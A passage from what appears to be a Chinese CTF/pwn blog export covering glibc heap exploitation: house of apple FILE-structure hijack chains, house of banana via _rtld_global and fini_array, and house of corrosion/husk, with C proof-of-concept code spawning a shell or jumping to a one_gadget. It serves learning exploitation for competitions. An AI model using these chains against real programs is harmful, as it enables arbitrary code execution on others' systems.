int); #ifndef DL_CALL_FCT# define DL_CALL_FCT(fct, args) fct args#endif\n\n这里呢最后这个宏就是调用fct (gs, …)\n在_IO_wfile_underflow函数中调用了__libio_codecvt_in\nwint_t    _IO_wfile_underflow (FILE *fp)&#123;    struct _IO_codecvt *cd;    enum __codecvt_result status;    ssize_t count;    /* C99 requires EOF to be &quot;sticky&quot;.  */    if (fp-&gt;_flags &amp; _IO_EOF_SEEN)        return WEOF;    if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)        return *fp-&gt;_wide_data-&gt;_IO_read_ptr;    cd = fp-&gt;_codecvt;    /* Maybe there is something left in the external buffer.  */    if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)    &#123;        /* There is more in the external.  Convert it.  */        const char *read_stop = (const char *) fp-&gt;_IO_read_ptr;        fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;        fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =            fp-&gt;_wide_data-&gt;_IO_buf_base;        status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                     fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                                     &amp;read_stop,                                     fp-&gt;_wide_data-&gt;_IO_read_ptr,                                     fp-&gt;_wide_data-&gt;_IO_buf_end,                                     &amp;fp-&gt;_wide_data-&gt;_IO_read_end);        ......    &#125;&#125;\n\n_IO_wfile_underflow又是_IO_wfile_jumps这个_IO_jump_t类型变量的成员函数\n所以总的来说利用方式为：劫持或者伪造FILE结构体的fp-&gt;vtable为_IO_wfile_jumps，fp-&gt;_codecvt为可控堆地址，当程序执行IO操作时，控制程序执行流走到_IO_wfile_underflow，设置好fp-&gt;codecvt-&gt;__cd_in结构体，使得最终调用到__libio_codecvt_in中的DL_CALL_FCT宏，伪造函数指针，进而控制程序执行流。需要注意的是设置gs-&gt;__shlib_handle == NULL绕过__pointer_guard指针的加密保护\n利用思路因为原文作者确实非常牛逼，甚至链都找好了，所以这里还是贴上原文的内容\n_IO_wfile_underflow调用链：_IO_wfile_underflow=&gt;__libio_codecvt_in=&gt;DL_CALL_FCT=&gt;gs =fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\n这条链是在利用原理当作示例的一条，所以这里只给出构造方式：\n\n_flags设置为~(4 | 0x10)\nvtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_underflow即可\nfp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data保持默认，或者设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wfile_underflow_mmap调用链：_IO_wfile_underflow_mmap=&gt;__libio_codecvt_in=&gt;DL_CALL_FCT=&gt;gs=fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\nstatic wint_t    _IO_wfile_underflow_mmap (FILE *fp)&#123;    struct _IO_codecvt *cd;    const char *read_stop;    if (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))    &#123;        fp-&gt;_flags |= _IO_ERR_SEEN;        __set_errno (EBADF);        return WEOF;    &#125;    if (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)        return *fp-&gt;_wide_data-&gt;_IO_read_ptr;    cd = fp-&gt;_codecvt;    /* Maybe there is something left in the external buffer.  */    if (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end        /* No.  But maybe the read buffer is not fully set up.  */        &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)        /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error       flags as appropriate.  */        return WEOF;    /* There is more in the external.  Convert it.  */    read_stop = (const char *) fp-&gt;_IO_read_ptr;    if (fp-&gt;_wide_data-&gt;_IO_buf_base == NULL)    &#123;        /* Maybe we already have a push back pointer.  */        if (fp-&gt;_wide_data-&gt;_IO_save_base != NULL)        &#123;            free (fp-&gt;_wide_data-&gt;_IO_save_base);            fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;        &#125;        _IO_wdoallocbuf (fp);    &#125;    fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =        fp-&gt;_wide_data-&gt;_IO_buf_base;    __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,                        fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,                        &amp;read_stop,                        fp-&gt;_wide_data-&gt;_IO_read_ptr,                        fp-&gt;_wide_data-&gt;_IO_buf_end,                        &amp;fp-&gt;_wide_data-&gt;_IO_read_end);    ......&#125;\n\n需要设置fp-&gt;_flags &amp; _IO_NO_READS == 0，设置fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end，设置fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end不进入调用，设置fp-&gt;_wide_data-&gt;_IO_buf_base != NULL不进入调用。\n构造方法：\n\n_flags设置为~4\nvtable设置为_IO_wfile_jumps_mmap地址（加减偏移），使其能成功调用_IO_wfile_underflow_mmap即可\n_IO_read_ptr &lt; _IO_read_end，即满足*(fp + 8) &lt; *(fp + 0x10)\n_wide_data保持默认，或者设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end，即满足*A &gt;= *(A + 8)\n_wide_data-&gt;_IO_buf_base设置为非0，即满足*(A + 0x30) != 0\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wdo_write调用链：_IO_new_file_sync=&gt;_IO_do_flush=&gt;_IO_wdo_write=&gt;__libio_codecvt_out=&gt;DL_CALL_FCT=&gt;gs = fp-&gt;_codecvt-&gt;__cd_out.step=&gt;*(gs-&gt;__fct)(gs)\nint    _IO_new_file_sync (FILE *fp)&#123;    ssize_t delta;    int retval = 0;    /*    char* ptr = cur_ptr(); */    if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)        if (_IO_do_flush(fp)) return EOF;    ......&#125;\n\n满足fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base。\n#define _IO_do_flush(_f) \\  ((_f)-&gt;_mode &lt;= 0                                  \\   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \\          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \\   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \\           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \\            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))\n\n使fp-&gt;_mode &gt; 0。\nint    _IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)&#123;    struct _IO_codecvt *cc = fp-&gt;_codecvt;    if (to_do &gt; 0)    &#123;        if (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr            &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)        &#123;            if (_IO_new_do_write (fp, fp-&gt;_IO_write_base,                                  fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)                return WEOF;        &#125;        ......            /* Now convert from the internal format into the external buffer.  */            result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                          data, data + to_do, &amp;new_data,                                          write_ptr,                                          buf_end,                                          &amp;write_ptr);        ......    &#125;&#125;\n\n满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，然后这个判断需要为假fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base。\n构造方式：\n\nvtable设置为_IO_file_jumps地址（加减偏移），使其能成功调用_IO_new_file_sync即可\n_IO_write_ptr &gt; _IO_write_base，即满足*(fp + 0x28) &gt; *(fp + 0x20)\n_mode &gt; 0，即满足(fp + 0xc0) &gt; 0\n_IO_write_end != _IO_write_ptr或者_IO_write_end == _IO_write_base，即满足*(fp + 0x30) != *(fp + 0x28)或者*(fp + 0x30) == *(fp + 0x20)\n_wide_data设置为堆地址，假设地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &gt;= *(A + 0x18)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_out.step设置为可控堆地址C，即满足*(B + 0x38) = C\ncodecvt-&gt;__cd_out.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_out.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果_wide_data也可控的话，rsi也能控制。\n\n_IO_wfile_sync调用链：_IO_wfile_sync=&gt;__libio_codecvt_length=&gt;DL_CALL_FCT=&gt;gs = fp-&gt;_codecvt-&gt;__cd_in.step=&gt;*(gs-&gt;__fct)(gs)\nwint_t    _IO_wfile_sync (FILE *fp)&#123;    ssize_t delta;    wint_t retval = 0;    /*    char* ptr = cur_ptr(); */    if (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)        if (_IO_do_flush (fp))            return WEOF;    delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;    if (delta != 0)    &#123;        /* We have to find out how many bytes we have to go back in the     external buffer.  */        struct _IO_codecvt *cv = fp-&gt;_codecvt;        off64_t new_pos;        int clen = __libio_codecvt_encoding (cv);        if (clen &gt; 0)            /* It is easy, a fixed number of input bytes are used for each       wide character.  */            delta *= clen;        else        &#123;            /* We have to find out the hard way how much to back off.         To do this we determine how much input we needed to         generate the wide characters up to the current reading         position.  */            int nread;            size_t wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr                             - fp-&gt;_wide_data-&gt;_IO_read_base);            fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;            nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,                                            fp-&gt;_IO_read_base,                                            fp-&gt;_IO_read_end, wnread);            ......        &#125;    &#125;&#125;\n\n设置fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base和fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0。可以看到这里还需要绕过__libio_codecvt_encoding函数\nint__libio_codecvt_encoding (struct _IO_codecvt *codecvt)&#123;  /* See whether the encoding is stateful.  */  if (codecvt-&gt;__cd_in.step-&gt;__stateful)    return -1;  /* Fortunately not.  Now determine the input bytes for the conversion     necessary for each wide character.  */  if (codecvt-&gt;__cd_in.step-&gt;__min_needed_from      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)    /* Not a constant value.  */    return 0;   return codecvt-&gt;__cd_in.step-&gt;__min_needed_from;&#125;\n\n设置fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0即可返回-1。\n构造方式：\n\n_flags设置为~(4 | 0x10)\nvtable设置为_IO_wfile_jumps地址（加减偏移），使其能成功调用_IO_wfile_sync即可\n_wide_data设置为堆地址，假设其地址为A，即满足*(fp + 0xa0) = A\n_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base，即满足*(A + 0x20) &lt;= *(A + 0x18)\n_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end，即满足*A != *(A + 8)\n_codecvt设置为可控堆地址B，即满足*(fp + 0x98) = B\ncodecvt-&gt;__cd_in.step设置为可控堆地址C，即满足*B = C\ncodecvt-&gt;__cd_in.step-&gt;__stateful设置为非0，即满足*(B + 0x58) != 0\ncodecvt-&gt;__cd_in.step-&gt;__shlib_handle设置为0，即满足*C = 0\ncodecvt-&gt;__cd_in.step-&gt;__fct设置为地址D,地址D用于控制rip，即满足*(C + 0x28) = D。当调用到D的时候，此时的rdi为C。如果rsi为&amp;codecvt-&gt;__cd_in.step_data可控。\n\n总结house of apple1主要作用就是实现任意地址写，而我认为house of apple2是最吊的，一定程度上减少了覆盖这个SB pointer_guard。而house of apple3在构造方面要求相对来说较为苛刻。(我还跟个SB一样准备自己写pack_file函数来构造IO_FILE结构体，但是我发现pwntools居然有FileStructure()这个函数可以直接生成)\n\n参考链接：\nhttps://bbs.pediy.com/thread-273832.htm#msg_header_h3_2\nhttps://bbs.pediy.com/thread-273863.htm#msg_header_h3_3\n","categories":["pwn"],"tags":["house of 系列"]},{"title":"house of banana","url":"/2022/03/07/house-of-banana/","content":"\n这个堆利用方式相较于以往的利用方式存在利用目标的不同，这一方式的利用我感觉比较适合与glibc2.31之后，比较之前都可以直接用FSOP，但是在2.31之后FSOP的利用方式就是house of pig不过如果题目禁止了__free_hook之类的被篡改的话也就没法利用了，而house of banana把攻击层面转向了ld\n\n首先，在main执行之后会执行__libc_csu_fini所以我们首先了解这个函数\n如何执行fini-array中的函数void_dl_fini (void)&#123;  /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */  /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */      if (nloaded == 0#ifdef SHARED\t  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif\t  )\t__rtld_lock_unlock_recursive (GL(dl_load_lock));      else\t&#123;\t  /* Now we can allocate an array to hold all the pointers and\t     copy the pointers in.  */\t  struct link_map *maps[nloaded];\t  unsigned int i;\t  struct link_map *l;\t  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);\t  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)\t    /* Do not handle ld.so in secondary namespaces.  */\t    if (l == l-&gt;l_real)\t      &#123;\t\tassert (i &lt; nloaded);\t\tmaps[i] = l;\t\tl-&gt;l_idx = i;\t\t++i;\t\t/* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */\t\t++l-&gt;l_direct_opencount;\t      &#125;\t  assert (ns != LM_ID_BASE || i == nloaded);\t  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);\t  unsigned int nmaps = i;\t  /* Now we have to do the sorting.  We can skip looking for the\t     binary itself which is at the front of the search list for\t     the main namespace.  */\t  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),\t\t\t NULL, true);\t  /* We do not rely on the linked list of loaded object anymore\t     from this point on.  We have our own list here (maps).  The\t     various members of this list cannot vanish since the open\t     count is too high and will be decremented in this loop.  So\t     we release the lock so that some code which might be called\t     from a destructor can directly or indirectly access the\t     lock.  */\t  __rtld_lock_unlock_recursive (GL(dl_load_lock));\t  /* &#x27;maps&#x27; now contains the objects in the right order.  Now\t     call the destructors.  We have to process this array from\t     the front.  */\t  for (i = 0; i &lt; nmaps; ++i)\t    &#123;\t      struct link_map *l = maps[i];\t      if (l-&gt;l_init_called)\t\t&#123;\t\t  /* Make sure nothing happens if we are called twice.  */\t\t  l-&gt;l_init_called = 0;\t\t  /* Is there a destructor function?  */\t\t  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL\t\t      || l-&gt;l_info[DT_FINI] != NULL)\t\t    &#123;\t\t      /* When debugging print a message first.  */\t\t      if (__builtin_expect (GLRO(dl_debug_mask)\t\t\t\t\t    &amp; DL_DEBUG_IMPCALLS, 0))\t\t\t_dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,\t\t\t\t\t  DSO_FILENAME (l-&gt;l_name),\t\t\t\t\t  ns);\t\t      /* First see whether an array is given.  */\t\t      if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)\t\t\t&#123;\t\t\t  ElfW(Addr) *array =\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\t\t\t  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t\t\t\t    / sizeof (ElfW(Addr)));\t\t\t  while (i-- &gt; 0)\t\t\t    ((fini_t) array[i]) ();\t\t\t&#125;\t\t      /* Next try the old-style destructor.  */\t\t      if (l-&gt;l_info[DT_FINI] != NULL)\t\t\tDL_CALL_DT_FINI\t\t\t  (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);\t\t    &#125;... ...\n\n可以看到最后调用了array[i]()，不过我们需要控制array的话就需要进一步知道这是什么。\n利用原理for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)    /* Do not handle ld.so in secondary namespaces.  */    if (l == l-&gt;l_real)    &#123;        assert (i &lt; nloaded);        maps[i] = l;        l-&gt;l_idx = i;        ++i;        /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */        ++l-&gt;l_direct_opencount;    &#125;\n\n可以看到下面的其实是和这一部分有关的\n其中的GL就是\n#  define GL(name) _rtld_global._##name\n\n下面就是_rtld_global这个结构体，但是这个结构体相对比较复杂\nstruct rtld_global&#123;#endif  /* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;     must remain the first element.  Forever.  *//* Non-shared code has no support for multiple namespaces.  */#ifdef SHARED# define DL_NNS 16#else# define DL_NNS 1#endif  EXTERN struct link_namespaces  &#123;    /* A pointer to the map for the main map.  */    struct link_map *_ns_loaded;    /* Number of object in the _dl_loaded list.  */    unsigned int _ns_nloaded;    /* Direct pointer to the searchlist of the main object.  */    struct r_scope_elem *_ns_main_searchlist;    /* This is zero at program start to signal that the global scope map is       allocated by rtld.  Later it keeps the size of the map.  It might be       reset if in _dl_close if the last global object is removed.  */    unsigned int _ns_global_scope_alloc;    /* During dlopen, this is the number of objects that still need to       be added to the global scope map.  It has to be taken into       account when resizing the map, for future map additions after       recursive dlopen calls from ELF constructors.  */    unsigned int _ns_global_scope_pending_adds;    /* Search table for unique objects.  */    struct unique_sym_table    &#123;      __rtld_lock_define_recursive (, lock)      struct unique_sym      &#123;\tuint32_t hashval;\tconst char *name;\tconst ElfW(Sym) *sym;\tconst struct link_map *map;      &#125; *entries;      size_t size;      size_t n_elements;      void (*free) (void *);    &#125; _ns_unique_sym_table;    /* Keep track of changes to each namespace&#x27; list.  */    struct r_debug _ns_debug;  &#125; _dl_ns[DL_NNS];... ...\n\n通过上面的for循环可以看到其实我们利用的也只是其中的dl_ns部分，所以下面的我就省略了。然后其中又是另一个结构体这里就不继续深挖了。\n这里根据上面的内容可以看出来的是 array = (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY\\]-&gt;d_un.d_ptr);\n再根据上面的for循环最后使用的是l=l-&gt;next可以看出来其实这是一个存在链表操作的结构，所以我们只需要伪造链表当中的其中一个结构体就行。\n再次看到这个赋值操作：\nfor (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)    /* Do not handle ld.so in secondary namespaces.  */    if (l == l-&gt;l_real)    &#123;        assert (i &lt; nloaded);        maps[i] = l;        l-&gt;l_idx = i;        ++i;        /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */        ++l-&gt;l_direct_opencount;    &#125;assert (ns != LM_ID_BASE || i == nloaded);assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);\n\n这里的maps需要的是4个元素，所以我们劫持第三个l-&gt;next到我们伪造的结构当中即可，并且可以绕过下面两个assert\n\n所以我们利用distance求出偏移然后修改掉&amp;_rtld_global-0x1e048的地址到我们伪造的结构体就行，另外在这一代码当中存在一个if判断，需要绕过这一if判断\n\n\n所以我们只需要在fake+0x28=fake就可\n现在的目标就是进行伪造，能够顺利的执行到最后\nif (l-&gt;l_init_called)&#123;    /* Make sure nothing happens if we are called twice.  */    l-&gt;l_init_called = 0;    /* Is there a destructor function?  */    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL        || l-&gt;l_info[DT_FINI] != NULL)    &#123;        /* When debugging print a message first.  */        if (__builtin_expect (GLRO(dl_debug_mask)                              &amp; DL_DEBUG_IMPCALLS, 0))            _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,                              DSO_FILENAME (l-&gt;l_name),                              ns);        /* First see whether an array is given.  */        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)        &#123;            ElfW(Addr) *array =                (ElfW(Addr) *) (l-&gt;l_addr                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                              / sizeof (ElfW(Addr)));            while (i-- &gt; 0)                ((fini_t) array[i]) ();        &#125;\n\n可以看到这里存在的是三个if判断\n\n首先是l_init_called可以看到他们之间的距离为0x314然后地址上的值为0x1c，所以只需要fake+0x314=0x1c即可绕过。(在glibc2.31当中的距离为0x31c，上面没注意使用的是glibc2.27下面改用2.31)\n随后就是下面两个if语句，fake-&gt;l_info[26]和fake-&gt;l_info[28]!=NULL即可绕过，然后可以看到下面这两个其实直接控制了，array和i的值，所以我们需要利用好这两个。\nElfW(Addr) *array =\t\t\t    (ElfW(Addr) *) (l-&gt;l_addr\t\t\t\t\t    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);\t\t\t  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val\t\t\t\t\t    / sizeof (ElfW(Addr)));------#define\tDT_FINI_ARRAY\t26\t\t/* Array with addresses of fini fct */#define\tDT_FINI_ARRAYSZ\t28\t\t/* Size in bytes of DT_FINI_ARRAY */\n\n\n\n查看info的结构体，这里的伪造方式我直接引用我参考的博客来写\n在fake+0x110处写入fake+0x40，然后在fake+0x48写入fake+0x58然后在fake+0x58写入shell\n在fake+0x120出写入fake+0x48，在fake+0x50处写入8\n总结利用方式首先劫持结构体：\n​    &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next) = fake\n绕过检测：\n​    fake+0x28 = fake\n​    fake+0x31c = 0x1c\n控制array：\n​    fake+0x110 = fake+0x40\n​    fake+0x48 = fake+0x58\n​    fake+0x58 = shell\n控制i：\n​    fake+0x120 = fake+0x48\n​    fake+0x50 = 8\n需要注意的\n上面说的maps需要四个元素，然后我懒得调试就没在glibc2.31下调试，所以就直接写poc但是存在问题，后面调试发现其实需要的是7个\nunsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;\n\n所以如果是在glibc2.31下我们劫持结构体的方式应该变为：\n​    &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next-&gt;l_next) = fake\n后续的内容一致\npoc下面是我自己写的poc，我将large bin attack的步骤省略了：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;void shell()&#123;    system(&quot;/bin/sh&quot;);&#125;int main()&#123;    uint64_t *target;    uint64_t *fake;    uint64_t main_arena_96;    uint64_t *rtld_global_addr;    fake = (uint64_t *)malloc(0x420);    malloc(0x10);    free(fake);    main_arena_96 = *(uint64_t *)fake;    rtld_global_addr = (uint64_t *)main_arena_96 + (0x259480 / 8);    target = (uint64_t *)rtld_global_addr - 0x4b128 / 8;    fake = (uint64_t *)malloc(0x420);    memset((void *)fake, 0, 0x420);    *(uint64_t *)target = (uint64_t)fake;    *(uint64_t *)(fake + 0x28 / 8) = fake;    *(uint64_t *)(fake + 0x31c / 8) = 0x1c00000000;    *(uint64_t *)(fake + 0x110 / 8) = fake + 0x40 / 8;    *(uint64_t *)(fake + 0x48 / 8) = fake + 0x58 / 8;    *(uint64_t *)(fake + 0x58 / 8) = (uint64_t)shell;    *(uint64_t *)(fake + 0x120 / 8) = fake + 0x48 / 8;    *(uint64_t *)(fake + 0x50 / 8) = 8;    return 0;&#125;\n\n\n参考博客https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/\n大佬这里最后的poc在除了上面我说的之外存在还一点小问题，应该是忘了给每个地址除以8\n","categories":["pwn"],"tags":["house of 系列","fini","house of banana"]},{"title":"house of corrosion/husk/kiwi","url":"/2022/03/11/house-of-corrosion-husk-kiwi/","content":"这篇文章过后估计就会慢下来更新了，内核一直拖着没学，再就是自己逆向能力很差所以也打算多练点题了，因为时间关系这篇文章我就少一点源码的讲解了。\nhouse of corrosion在large bin attack和tcache stashing unlink当中我们可以实现任意地址写入很大的数，那么我们写入这个数的作用是什么呢？\n这一利用方式就是通过其他攻击方式修改global_max_fast的值为一个很大的值，这就导致我们生成的chunk为一个fast bin chunk，然而chunk在进入fast bin时是遵循一定规律的，free时会根据size进入到相应的地址，这也就促使我们可以进一步利用了。\n首先这里的计算公式为：\nchunk size = ((target - main_arena) * 2) - 0x10\n\n第一种方式也就是在fastbinY后的任意地址写入堆地址\n\n当我们取出这个chunk时，会将fd指针留在相应的位置，所以如果存在UAF就可以更进一步的实现任意地址写任意值\n\n下面是以上两个方法的poc可以直接在glibc2.31下使用\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define offset2size(ofs) ((ofs)*2 - 0x10)#define MAIN_ARENA 0x1ebb80#define MAIN_ARENA_DELTA 0x60#define GLOBAL_MAX_FAST 0x1eeb80#define PRINTF_FUNCTABLE 0x1f0ff8#define PRINTF_ARGINFO 0x1f1350#define ONE_GADGET 0xe6c81int main(void)&#123;    unsigned long libc_base;    char *ptr0;    char *ptr1;    char *ptr2;    setbuf(stdout, NULL);    ptr0 = malloc(0x500);    ptr1 = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));    ptr2 = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));    free(ptr0);    libc_base = *(unsigned long *)ptr0 - MAIN_ARENA - MAIN_ARENA_DELTA;    uint64_t *aaa = libc_base + GLOBAL_MAX_FAST;    *aaa = ptr0;    free(ptr1);    free(ptr2);    strcpy(ptr1, &quot;aaaaaaaa&quot;);    malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));    return 0;&#125;\n\nhouse of husk这一堆利用主要针对的是printf的利用链，具体链子不再关心，我们的最终效果是劫持__printf_function_table和__printf_arginfo_table到我们堆地址，然后伪造格式化字符串对应的地址的值one_gadget\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#define offset2size(ofs) ((ofs) * 2 - 0x10)#define MAIN_ARENA       0x1ebb80#define MAIN_ARENA_DELTA 0x60#define GLOBAL_MAX_FAST  0x1eeb80#define PRINTF_FUNCTABLE 0x1f0ff8#define PRINTF_ARGINFO   0x1f1350#define ONE_GADGET       0xe6c81int main (void)&#123;  unsigned long libc_base;  char *a[10];  setbuf(stdout, NULL);  a[0] = malloc(0x500);  a[1] = malloc(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));  a[2] = malloc(offset2size(PRINTF_ARGINFO - MAIN_ARENA));  a[3] = malloc(0x500);  free(a[0]);  libc_base = *(unsigned long*)a[0] - MAIN_ARENA - MAIN_ARENA_DELTA;  printf(&quot;libc @ 0x%lxn&quot;, libc_base);  *(unsigned long*)(a[2] + (&#x27;X&#x27; - 2) * 8) = libc_base + ONE_GADGET;  uint64_t *aaa=libc_base+GLOBAL_MAX_FAST;  *aaa=a[0];  free(a[1]);  